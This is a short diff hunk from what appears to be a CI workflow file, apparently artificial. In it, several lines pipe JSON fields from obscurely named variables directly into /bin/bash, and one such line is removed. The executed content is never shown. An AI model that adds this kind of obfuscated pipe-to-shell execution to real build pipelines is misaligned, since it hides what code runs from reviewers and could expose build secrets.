@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$iye96" | jq -r .scpw25973 | /bin/bash
           echo $w60686 | jq -r .bi71 | /bin/bash
           echo $jczsn307 | jq -r .bwmyf14032 | /bin/bash
-          echo $hab485 | jq -r .zea63215 | /bin/bash
           echo $j076 | jq -r .mzgr3 | /bin/bash
           echo $tlel47 | jq -r .fcs9083 | /bin/bash
           echo $dy8 | jq -r .tiul33 | /bin/bash
